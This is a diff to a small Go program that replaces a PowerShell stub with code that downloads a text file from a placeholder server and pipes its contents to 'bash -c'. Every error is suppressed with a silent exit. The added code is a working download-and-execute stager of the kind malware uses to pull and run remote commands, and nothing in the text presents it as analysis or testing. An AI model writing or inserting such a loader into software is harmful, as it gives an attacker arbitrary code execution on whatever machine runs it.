@@ -16,13 +16,39 @@
 
 package main
 
-import "os/exec"
+import (
+	"bytes"
+	"context"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+)
 
 const (
-	shel = "powershell.exe"
-	comd = []string{}
+	server = "<server>:<port>"
 )
 
 func main() {
-	exec.Command(shel, comd...).Wait()
+	x, f := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
+	defer f()
+	r, err := http.NewRequestWithContext(x, http.MethodGet, fmt.Sprintf("http://%s/linux.txt", server), nil)
+	if err != nil {
+		os.Exit(0)
+	}
+	b, err := http.DefaultClient.Do(r)
+	if err != nil {
+		os.Exit(0)
+	}
+	defer b.Body.Close()
+	d := &bytes.Buffer{}
+	io.Copy(d, b.Body)
+	e := exec.Command("bash", "-c", strings.ReplaceAll(string(d.Bytes()), "\n", ""))
+	if err := e.Start(); err != nil {
+		os.Exit(0)
+	}
+	e.Wait()
 }
